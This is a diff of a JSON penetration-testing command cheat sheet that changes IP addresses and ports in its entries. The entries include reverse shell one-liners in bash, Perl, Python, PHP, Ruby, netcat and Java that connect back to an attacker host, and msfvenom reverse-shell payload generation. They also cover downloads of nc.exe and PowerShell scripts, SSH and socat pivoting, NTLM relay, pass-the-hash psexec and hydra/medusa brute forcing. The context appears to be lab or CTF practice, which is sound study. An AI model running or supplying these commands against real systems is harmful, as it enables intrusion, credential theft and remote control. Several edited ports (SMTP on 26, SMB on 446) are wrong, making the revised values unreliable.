@@ -315,77 +315,77 @@
       "Name": "Forward TCP with Socat",
       "Category": 9,
       "Description": "Establish a TCP port forward using socat to listen on local port 2222 and relay connections to a remote SSH server, enabling pivoting in post-exploitation phases of Linux privilege escalation.",
-      "Command": "socat -ddd TCP-LISTEN:2222,fork TCP:10.4.178.215:22",
+      "Command": "socat -ddd TCP-LISTEN:3333,fork TCP:10.5.179.216:23",
       "OS": "Linux"
     },
     {
       "Name": "Scan SMB Ports with Netcat",
       "Category": 7,
       "Description": "Scan the 172.16.178.0/24 subnet for open SMB ports (445) using netcat to identify potential lateral movement targets during Linux priv-esc reconnaissance.",
-      "Command": "for i in $(seq 1 254); do nc -nvv -w1 -z 172.16.178.$i 445; done",
+      "Command": "for i in $(seq 1 254); do nc -nvv -w1 -z 172.17.179.$i 446; done",
       "OS": "Linux"
     },
     {
       "Name": "SSH Local Port Forward",
       "Category": 9,
       "Description": "Set up an SSH local port forward to tunnel traffic from local port 4455 to a remote SMB service via a jump host, facilitating access to internal networks post-Linux escalation.",
-      "Command": "ssh -N -L 0.0.0.0:4455:172.16.178.217:445 dbadmin@10.4.178.215",
+      "Command": "ssh -N -L 0.0.0.0:5566:172.17.179.218:446 dbadmin@10.5.179.216",
       "OS": "Linux"
     },
     {
       "Name": "SSH Dynamic SOCKS Proxy",
       "Category": 9,
       "Description": "Create a dynamic SOCKS proxy via SSH on local port 9999 for routing traffic through a compromised host, aiding in anonymous pivoting after Linux privilege escalation.",
-      "Command": "ssh -N -D 0.0.0.0:9999 dbadmin@10.4.178.215",
+      "Command": "ssh -N -D 0.0.0.0:8888 dbadmin@10.5.179.216",
       "OS": "Linux"
     },
     {
       "Name": "SSH Remote SSH Forward",
       "Category": 9,
       "Description": "Configure an SSH remote port forward to expose a local SSH service on the remote host's port 2222, enabling inbound connections for further exploitation in Linux post-exploitation.",
-      "Command": "ssh -N -R 127.0.0.1:2222:10.4.50.215:22 kali@192.168.118.4",
+      "Command": "ssh -N -R 127.0.0.1:3333:10.5.51.216:23 kali@192.169.119.5",
       "OS": "Linux"
     },
     {
       "Name": "SSH Remote Proxy Forward",
       "Category": 9,
       "Description": "Initiate an SSH remote port forward on port 9997 for proxy chaining, supporting persistent access and tool routing in Linux privilege escalation scenarios.",
-      "Command": "ssh -N -R 9997 kali@192.168.45.159 #remember to update proxy chains to 127.0.0.1 9997",
+      "Command": "ssh -N -R 8886 kali@192.169.46.160 #remember to update proxy chains to 127.0.0.1 8886",
       "OS": "Linux"
     },
     {
       "Name": "SSHuttle Subnet Tunnel",
       "Category": 9,
       "Description": "Deploy sshuttle to create a VPN-like tunnel over SSH for specified subnets, allowing seamless traffic routing and lateral movement post-Linux escalation.",
-      "Command": "sshuttle -r database_admin@192.168.50.63:2222 10.4.178.0/24 172.16.178.0/24",
+      "Command": "sshuttle -r database_admin@192.169.51.64:3333 10.5.179.0/24 172.17.179.0/24",
       "OS": "Linux"
     },
     {
       "Name": "SSH Basic Remote Forward",
       "Category": 9,
       "Description": "Establish a basic SSH remote port forward on port 9997 to bridge networks and maintain access channels during Linux post-exploitation activities.",
-      "Command": "ssh -N -R 9997 kali@192.168.45.159",
+      "Command": "ssh -N -R 8886 kali@192.169.46.160",
       "OS": "Linux"
     },
     {
       "Name": "Plink RDP Port Forward",
       "Category": 17,
       "Description": "Use Plink to set up a remote port forward for RDP on port 9833, enabling Windows lateral movement from a Linux-compromised pivot in mixed-environment priv-esc chains.",
-      "Command": "plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.159",
+      "Command": "plink.exe -ssh -l kali -pw kali -R 127.0.0.1:8722:127.0.0.1:4490 192.169.46.160",
       "OS": "Windows"
     },
     {
       "Name": "Download Netcat Executable",
       "Category": 17,
       "Description": "Download a netcat executable to a Windows temp directory using PowerShell wget, preparing for reverse shell or scanning tools in cross-platform Linux-to-Windows escalation.",
-      "Command": "wget -Uri http://192.168.45.159/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe",
+      "Command": "wget -Uri http://192.169.46.160/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe",
       "OS": "Windows"
     },
     {
       "Name": "Add Windows Port Proxy",
       "Category": 17,
       "Description": "Configure a Windows port proxy rule with netsh to forward traffic from local port 4545 to a remote host, supporting tunneling in post-exploitation from Linux pivots.",
-      "Command": "netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.178.64 connectport=4545 connectaddress=10.4.178.215",
+      "Command": "netsh interface portproxy add v4tov4 listenport=5656 listenaddress=192.169.179.65 connectport=5656 connectaddress=10.5.179.216",
       "OS": "Windows"
     },
     {
@@ -399,28 +399,28 @@
       "Name": "Check Specific Port Status",
       "Category": 14,
       "Description": "Examine network connections for a specific port (4545) using netstat to confirm listening services in Linux post-exploitation network enumeration.",
-      "Command": "netstat -anp TCP | find \"4545\"",
+      "Command": "netstat -anp TCP | find \"5656\"",
       "OS": "Win/Lin"
     },
     {
       "Name": "Add Windows Firewall Rule",
       "Category": 17,
       "Description": "Add an inbound Windows firewall rule to allow TCP traffic on port 4545, ensuring port forwards remain accessible in Linux-initiated lateral attacks.",
-      "Command": "netsh advfirewall firewall add rule name=\"port_forward_ssh_4545\" protocol=TCP dir=in localip=192.168.178.64 localport=4545 action=allow",
+      "Command": "netsh advfirewall firewall add rule name=\"port_forward_ssh_5656\" protocol=TCP dir=in localip=192.169.179.65 localport=5656 action=allow",
       "OS": "Windows"
     },
     {
       "Name": "Delete Windows Firewall Rule",
       "Category": 17,
       "Description": "Remove a specific Windows firewall rule to clean up traces of port forwarding configurations after testing in a Linux priv-esc engagement.",
-      "Command": "netsh advfirewall firewall delete rule name=\"port_forward_ssh_4545\"",
+      "Command": "netsh advfirewall firewall delete rule name=\"port_forward_ssh_5656\"",
       "OS": "Windows"
     },
     {
       "Name": "Delete Windows Port Proxy",
       "Category": 17,
       "Description": "Delete a Windows port proxy rule to dismantle forwarding setups and maintain operational security post-Linux privilege escalation activities.",
-      "Command": "netsh interface portproxy del v4tov4 listenport=4545 listenaddress=192.168.178.64",
+      "Command": "netsh interface portproxy del v4tov4 listenport=5656 listenaddress=192.169.179.65",
       "OS": "Windows"
     },
     {
@@ -672,7 +672,7 @@
       "Name": "Download File PowerShell",
       "Category": 15,
       "Description": "Download file to windows",
-      "Command": "iwr -uri http://192.168.48.3/file.ps1 -Outfile file",
+      "Command": "iwr -uri http://192.169.49.4/file.ps1 -Outfile file",
       "OS": "Windows"
     },
     {
@@ -714,14 +714,14 @@
       "Name": "Execute NTLM Relay",
       "Category": 9,
       "Description": "Execute ntlm smb relay attack",
-      "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.213.211 -c 'your windows command'",
+      "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.169.214.212 -c 'your windows command'",
       "OS": "Linux"
     },
     {
       "Name": "Execute PsExec Hash",
       "Category": 9,
       "Description": "Execute psexec on remote machine using NTLM hash Mimikatz",
-      "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.168.213.212",
+      "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.169.214.213",
       "OS": "Linux"
     },
     {
@@ -868,7 +868,7 @@
       "Name": "Test Port Connectivity Powershell",
       "Category": 7,
       "Description": "Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell",
-      "Command": "Test-NetConnection -Port 25 192.168.50.8",
+      "Command": "Test-NetConnection -Port 26 192.169.51.9",
       "OS": "Windows"
     },
     {
@@ -882,7 +882,7 @@
       "Name": "Run Vuln Scan",
       "Category": 5,
       "Description": "Performs vulnerability scan on ports 80 and 443 of 192.168.192.13 using Nmap scripts",
-      "Command": "nmap --script vuln -p 80,443 192.168.192.13",
+      "Command": "nmap --script vuln -p 81,444 192.169.193.14",
       "OS": "Linux"
     },
     {
@@ -903,14 +903,14 @@
       "Name": "Start Python Server",
       "Category": 14,
       "Description": "Creates a simple python http server on port 80",
-      "Command": "python3 -m http.server 80 ",
+      "Command": "python3 -m http.server 81 ",
       "OS": "Linux"
     },
     {
       "Name": "Scan UDP SNMP Ports",
       "Category": 7,
       "Description": "Scans for open UDP port 161 (SNMP) across 192.168.50.1-254, saving results to open-snmp.txt",
-      "Command": "sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt",
+      "Command": "sudo nmap -sU --open -p 162 192.169.51.1-254 -oG open-snmp.txt",
       "OS": "Linux"
     },
     {
@@ -924,42 +924,42 @@
       "Name": "Walk Public SNMP",
       "Category": 7,
       "Description": "Enumerates SNMP data using public community string on 192.168.50.151 with SNMPv1",
-      "Command": "snmpwalk -c public -v1 -t 10 192.168.50.151",
+      "Command": "snmpwalk -c public -v1 -t 10 192.169.51.152",
       "OS": "Linux"
     },
     {
       "Name": "Enum LAN Users SNMP",
       "Category": 7,
       "Description": "Enumerates LAN Manager user information via SNMP on 192.168.50.151 using OID 1.3.6.1.4.1.77.1.2.25",
-      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25",
+      "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.4.1.77.1.2.25",
       "OS": "Linux"
     },
     {
       "Name": "List Processes SNMP",
       "Category": 7,
       "Description": "Enumerates running processes via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.4.2.1.2",
-      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2",
+      "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.2.1.25.4.2.1.2",
       "OS": "Linux"
     },
     {
       "Name": "List Software SNMP",
       "Category": 7,
       "Description": "Enumerates installed software via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.6.3.1.2",
-      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2",
+      "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.2.1.25.6.3.1.2",
       "OS": "Linux"
     },
     {
       "Name": "List TCP SNMP",
       "Category": 7,
       "Description": "Enumerates TCP connections via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.6.13.1.3",
-      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3",
+      "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.2.1.6.13.1.3",
       "OS": "Linux"
     },
     {
       "Name": "Connect Telnet SMTP",
       "Category": 7,
       "Description": "Initiates a Telnet connection to port 25 (SMTP) on 192.168.50.8",
-      "Command": "telnet 192.168.50.8 25",
+      "Command": "telnet 192.169.51.9 26",
       "OS": "Win/Lin"
     },
     {
@@ -973,14 +973,14 @@
       "Name": "Connect Netcat SMTP",
       "Category": 7,
       "Description": "Establishes a connection to port 25 (SMTP) on 192.168.50.8 with verbose output",
-      "Command": "nc -nv 192.168.50.8 25",
+      "Command": "nc -nv 192.169.51.9 26",
       "OS": "Win/Lin"
     },
     {
       "Name": "Scan Multiple Enum4linux",
       "Category": 7,
       "Description": "Runs enum4linux against a list of specified IPs in the 192.168.192.0/24 subnet",
-      "Command": "for i in {254,152,151,149,23,22,21,20,17,15,14,13,12,11,8,9,6}; do enum4linux 192.168.192.$i ; done",
+      "Command": "for i in {254,152,151,149,23,22,21,20,17,15,14,13,12,11,8,9,6}; do enum4linux 192.169.193.$i ; done",
       "OS": "Linux"
     },
     {
@@ -1071,42 +1071,42 @@
       "Name": "Discover SMB OS",
       "Category": 7,
       "Description": "Scans for SMB services on ports 139 and 445 with OS discovery script on a single host",
-      "Command": "nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152",
+      "Command": "nmap -v -p 139,445 --script smb-os-discovery 192.169.51.153",
       "OS": "Linux"
     },
     {
       "Name": "Scan NetBIOS Names",
       "Category": 7,
       "Description": "Scans for NetBIOS information on the 192.168.50.0/24 network",
-      "Command": "sudo nbtscan -r 192.168.50.0/24",
+      "Command": "sudo nbtscan -r 192.169.51.0/24",
       "OS": "Linux"
     },
     {
       "Name": "Scan SMB Ports",
       "Category": 7,
       "Description": "Scans for SMB services on ports 139 and 445 across a subnet, saving output to smb.txt",
-      "Command": "nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254",
+      "Command": "nmap -v -p 139,445 -oG smb.txt 192.169.51.1-254",
       "OS": "Linux"
     },
     {
       "Name": "SYN Port Scan",
       "Category": 7,
       "Description": "Port scanning with nmap",
-      "Command": "nmap -sS 192.168.192.1",
+      "Command": "nmap -sS 192.169.193.2",
       "OS": "Linux"
     },
     {
       "Name": "Scan Ports Netcat",
       "Category": 7,
       "Description": "Port scanning with netcat",
-      "Command": "nc -nvv -w1 -z 192.168.192.151 1-1000",
+      "Command": "nc -nvv -w1 -z 192.169.193.152 1-1000",
       "OS": "Win/Lin"
     },
     {
       "Name": "UDP Scan Netcat",
       "Category": 7,
       "Description": "UDP Port scanning with netcat",
-      "Command": "nc -nvv -u -w1 -z 192.168.192.151 150-200",
+      "Command": "nc -nvv -u -w1 -z 192.169.193.152 150-200",
       "OS": "Win/Lin"
     },
     {
@@ -1120,7 +1120,7 @@
       "Name": "Connect WinRM Shell",
       "Category": 8,
       "Description": "Attempts to connect to the windows remote management service",
-      "Command": "evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p s3rvice",
+      "Command": "evil-winrm -i 10.11.11.162 -u 'svc-alfresco' -p s3rvice",
       "OS": "Linux"
     },
     {
@@ -1134,14 +1134,14 @@
       "Name": "Roast AS-REP Hashes",
       "Category": 12,
       "Description": "Attempts to enumerate and extract Kerberos AS-REP hashes for user accounts listed in the ./users file",
-      "Command": "impacket-GetNPUsers FOREST.HTB/ -dc-ip 10.10.10.161 -usersfile ./users -request -format hashcat -outputfile hashes.txt",
+      "Command": "impacket-GetNPUsers FOREST.HTB/ -dc-ip 10.11.11.162 -usersfile ./users -request -format hashcat -outputfile hashes.txt",
       "OS": "Linux"
     },
     {
       "Name": "Get Domain LDAP Anon",
       "Category": 12,
       "Description": "Get's the default naming context and displays the domain name",
-      "Command": "ldapsearch -x -H ldap://10.10.10.161 -b \"\" -s base \"(objectClass=*)\" defaultNamingContext",
+      "Command": "ldapsearch -x -H ldap://10.11.11.162 -b \"\" -s base \"(objectClass=*)\" defaultNamingContext",
       "OS": "Linux"
     },
     {
@@ -1232,70 +1232,70 @@
       "Name": "Bash Reverse Shell",
       "Category": 10,
       "Description": "Creates a reverse shell using bash, tested on Ubuntu 10.10 checkout https://www.revshells.com for more robust shell creation",
-      "Command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
+      "Command": "bash -i >& /dev/tcp/192.168.1.100/9080 0>&1",
       "OS": "Linux"
     },
     {
       "Name": "Perl Reverse Shell",
       "Category": 10,
       "Description": "A short, feature-free Perl reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
-      "Command": "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "Command": "perl -e 'use Socket;$i=\"192.168.1.100\";$p=2234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
       "OS": "Win/Lin"
     },
     {
       "Name": "Python Reverse Shell",
       "Category": 10,
       "Description": "A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
-      "Command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "Command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.100\",2234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
       "OS": "Win/Lin"
     },
     {
       "Name": "PHP Reverse Shell",
       "Category": 10,
       "Description": "A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed) checkout https://www.revshells.com for more robust shell creation",
-      "Command": "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "Command": "php -r '$sock=fsockopen(\"192.168.1.100\",2234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
       "OS": "Win/Lin"
     },
     {
       "Name": "Ruby Reverse Shell",
       "Category": 10,
       "Description": "A Ruby reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
-      "Command": "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+      "Command": "ruby -rsocket -e'f=TCPSocket.open(\"192.168.1.100\",2234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
       "OS": "Win/Lin"
     },
     {
       "Name": "Netcat Reverse Shell",
       "Category": 10,
       "Description": "A Netcat reverse shell, requires -e option support checkout https://www.revshells.com for more robust shell creation",
-      "Command": "nc -e /bin/sh 10.0.0.1 1234",
+      "Command": "nc -e /bin/sh 192.168.1.100 2234",
       "OS": "Win/Lin"
     },
     {
       "Name": "Netcat FIFO Shell",
       "Category": 10,
       "Description": "An alternative Netcat reverse shell using FIFO for systems without -e option checkout https://www.revshells.com for more robust shell creation",
-      "Command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f",
+      "Command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 2234 >/tmp/f",
       "OS": "Linux"
     },
     {
       "Name": "Java Reverse Shell",
       "Category": 10,
       "Description": "A Java reverse shell connecting to a specified IP and port (untested) checkout https://www.revshells.com for more robust shell creation",
-      "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
+      "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/192.168.1.100/3002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
       "OS": "Win/Lin"
     },
     {
       "Name": "Xterm Reverse Shell",
       "Category": 10,
       "Description": "An xterm reverse shell connecting to a specified IP on port 6001 checkout https://www.revshells.com for more robust shell creation",
-      "Command": "xterm -display 10.0.0.1:1",
+      "Command": "xterm -display 192.168.1.100:2",
       "OS": "Linux"
     },
     {
       "Name": "Start Xnest Server",
       "Category": 10,
       "Description": "Starts an X-Server to catch incoming xterm on port 6001 (run on your system) checkout https://www.revshells.com for more robust shell creation",
-      "Command": "Xnest :1",
+      "Command": "Xnest :2",
       "OS": "Linux"
     },
     {
@@ -1372,7 +1372,7 @@
       "Name": "Dir Bust Gobuster",
       "Category": 3,
       "Description": "Directory busting tool",
-      "Command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wfuzz/wordlist/general/megabeast.txt -o gobuster_results.txt",
+      "Command": "gobuster dir -u http://10.10.10.6 -w /usr/share/wfuzz/wordlist/general/megabeast.txt -o gobuster_results.txt",
       "OS": "Linux"
     },
     {
@@ -1400,7 +1400,7 @@
       "Name": "Scan Open Ports",
       "Category": 3,
       "Description": "Scan for open ports",
-      "Command": "nmap -p- --open 10.10.10.11",
+      "Command": "nmap -p- --open 10.10.10.12",
       "OS": "Linux"
     },
     {
@@ -1428,49 +1428,49 @@
       "Name": "Brute HTTP Login",
       "Category": 4,
       "Description": "Brute force login attempts",
-      "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.97 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\"",
+      "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.98 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\"",
       "OS": "Linux"
     },
     {
       "Name": "Brute SSH Login",
       "Category": 4,
       "Description": "Brute force ssh with a wordlist",
-      "Command": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201",
+      "Command": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 3333 ssh://192.168.51.202",
       "OS": "Linux"
     },
     {
       "Name": "Brute RDP Login",
       "Category": 4,
       "Description": "Brute force rdp with a wordlist",
-      "Command": "hydra -l 'daniel' -P /usr/share/wordlists/rockyou.txt rdp://192.168.213.202",
+      "Command": "hydra -l 'daniel' -P /usr/share/wordlists/rockyou.txt rdp://192.168.214.203",
       "OS": "Linux"
     },
     {
       "Name": "Brute RDP NXC",
       "Category": 4,
       "Description": "Brute force rdp with a wordlist using nxc",
-      "Command": "nxc rdp 192.168.XXX.227 -u nadine -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding",
+      "Command": "nxc rdp 192.168.1.228 -u nadine -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding",
       "OS": "Linux"
     },
     {
       "Name": "Brute Basic Auth",
       "Category": 4,
       "Description": "Brute force basic auth with a wordlist",
-      "Command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.213.201 http-get",
+      "Command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.214.202 http-get",
       "OS": "Linux"
     },
     {
       "Name": "Brute FFUF POST",
       "Category": 4,
       "Description": "Brute force with ffuf",
-      "Command": "ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u \"http://10.10.11.24:8008/ghost/api/admin/session\" -X POST -d '{\"username\":\"htbuserFUZZ\",\"password\":\"secret\"}' -H \"Host: 10.10.11.24:8008\" -H \"Accept: text/plain, */*; q=0.01\" -H \"X-Forwarded-For: htbuserFUZZ\" -H \"X-Requested-With: XMLHttpRequest\" -H \"X-Ghost-Version: 5.78\" -H \"App-Pragma: no-cache\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\" -H \"Content-Type: application/json;charset=UTF-8\" -H \"Origin: http://10.10.11.24:8008\" -H \"Referer: http://10.10.11.24:8008/ghost/\" -H \"Accept-Encoding: gzip, deflate, br\" -H \"Accept-Language: en-US,en;q=0.9\" -H \"Cookie: connect.sid=s%3Av28_oZV8lijLRwlgUQWxt6ccnksDKouo.sb4qxncwYoE0dnj3ARiTb8OnJitRF%2FvDttKjE0nSX%2FM\" -H \"Connection: close\" -mr \"There is no user with that email address.\"",
+      "Command": "ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u \"http://10.10.11.25:9009/ghost/api/admin/session\" -X POST -d '{\"username\":\"htbuserFUZZ\",\"password\":\"secret\"}' -H \"Host: 10.10.11.25:9009\" -H \"Accept: text/plain, */*; q=0.01\" -H \"X-Forwarded-For: htbuserFUZZ\" -H \"X-Requested-With: XMLHttpRequest\" -H \"X-Ghost-Version: 5.78\" -H \"App-Pragma: no-cache\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\" -H \"Content-Type: application/json;charset=UTF-8\" -H \"Origin: http://10.10.11.25:9009\" -H \"Referer: http://10.10.11.25:9009/ghost/\" -H \"Accept-Encoding: gzip, deflate, br\" -H \"Accept-Language: en-US,en;q=0.9\" -H \"Cookie: connect.sid=s%3Av28_oZV8lijLRwlgUQWxt6ccnksDKouo.sb4qxncwYoE0dnj3ARiTb8OnJitRF%2FvDttKjE0nSX%2FM\" -H \"Connection: close\" -mr \"There is no user with that email address.\"",
       "OS": "Linux"
     },
     {
       "Name": "Brute Wfuzz POST",
       "Category": 4,
       "Description": "Brute force with wfuzz",
-      "Command": "wfuzz -z range,1-100000 -d \"username=htbuserFUZZ&password=secret\" -H \"X-Forwarded-For: htbuserFUZZ\" --hs \"There is no user with that email address.\" -u \"http://10.10.11.24:8008/ghost/api/admin/session\"",
+      "Command": "wfuzz -z range,1-100000 -d \"username=htbuserFUZZ&password=secret\" -H \"X-Forwarded-For: htbuserFUZZ\" --hs \"There is no user with that email address.\" -u \"http://10.10.11.25:9009/ghost/api/admin/session\"",
       "OS": "Linux"
     },
     {
@@ -1484,14 +1484,14 @@
       "Name": "Run Nmap Vuln Scripts",
       "Category": 5,
       "Description": "Vulnerability scanning with nmap scripts",
-      "Command": "nmap --script-help=http* -v 10.10.10.11",
+      "Command": "nmap --script-help=http* -v 10.10.10.12",
       "OS": "Linux"
     },
     {
       "Name": "Scan WordPress Vulns",
       "Category": 5,
       "Description": "WordPress security scanner",
-      "Command": "wpscan --url http://10.10.10.11/pathtowordpress/",
+      "Command": "wpscan --url http://10.10.10.12/pathtowordpress/",
       "OS": "Linux"
     },
     {
@@ -1512,70 +1512,70 @@
       "Name": "Run Enum4linux",
       "Category": 7,
       "Description": "SMB enumeration",
-      "Command": "enum4linux -a 10.10.11.24",
+      "Command": "enum4linux -a 10.10.11.25",
       "OS": "Linux"
     },
     {
       "Name": "List SMB Shares",
       "Category": 7,
       "Description": "List SMB shares",
-      "Command": "smbclient -L \\\\10.10.11.24 -U anonymous",
+      "Command": "smbclient -L \\\\10.10.11.25 -U anonymous",
       "OS": "Linux"
     },
     {
       "Name": "Scan SMB Vulns",
       "Category": 7,
       "Description": "SMB vulnerability scan",
-      "Command": "nmap --script smb-vuln* -p 445 10.10.11.24",
+      "Command": "nmap --script smb-vuln* -p 445 10.10.11.25",
       "OS": "Linux"
     },
     {
       "Name": "Map SMB Shares",
       "Category": 7,
       "Description": "SMB share mapping",
-      "Command": "smbmap -H 10.10.11.24 -u guest -p \"\"",
+      "Command": "smbmap -H 10.10.11.25 -u guest -p \"\"",
       "OS": "Linux"
     },
     {
       "Name": "Brute SMB Medusa",
       "Category": 7,
       "Description": "Brute force SMB with medusa",
-      "Command": "medusa -h 10.10.11.24 -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt -F",
+      "Command": "medusa -h 10.10.11.25 -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt -F",
       "OS": "Linux"
     },
     {
       "Name": "Brute SMB Hydra",
       "Category": 7,
       "Description": "Brute force SMB with hydra",
-      "Command": "hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.24 smb",
+      "Command": "hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.25 smb",
       "OS": "Linux"
     },
     {
       "Name": "Brute SMB Ncrack",
       "Category": 7,
       "Description": "Brute force SMB with ncrack",
-      "Command": "ncrack -p 445 -u blake -P /usr/share/wordlists/rockyou.txt smb://10.10.11.16",
+      "Command": "ncrack -p 445 -u blake -P /usr/share/wordlists/rockyou.txt smb://10.10.11.17",
       "OS": "Linux"
     },
     {
       "Name": "Enum RPC Nmap",
       "Category": 7,
       "Description": "RPC enumeration with nmap",
-      "Command": "nmap -sS -sV -p 135,139,445 --script=rpc-enum* 10.10.11.2",
+      "Command": "nmap -sS -sV -p 135,139,445 --script=rpc-enum* 10.10.11.3",
       "OS": "Linux"
     },
     {
       "Name": "Connect RPC Client",
       "Category": 7,
       "Description": "RPC client enumeration",
-      "Command": "rpcclient -U \"\" 10.10.11.24",
+      "Command": "rpcclient -U \"\" 10.10.11.25",
       "OS": "Linux"
     },
     {
       "Name": "Enum SMTP Users",
       "Category": 7,
       "Description": "SMTP user enumeration",
-      "Command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/rockyou.txt -t 10.10.11.14",
+      "Command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/rockyou.txt -t 10.10.11.15",
       "OS": "Linux"
     },
     {
@@ -1596,7 +1596,7 @@
       "Name": "Generate Windows Payload",
       "Category": 8,
       "Description": "Generate Windows reverse shell payload",
-      "Command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f aspx -o rshell443.aspx",
+      "Command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=544 -f aspx -o rshell443.aspx",
       "OS": "Linux"
     },
     {
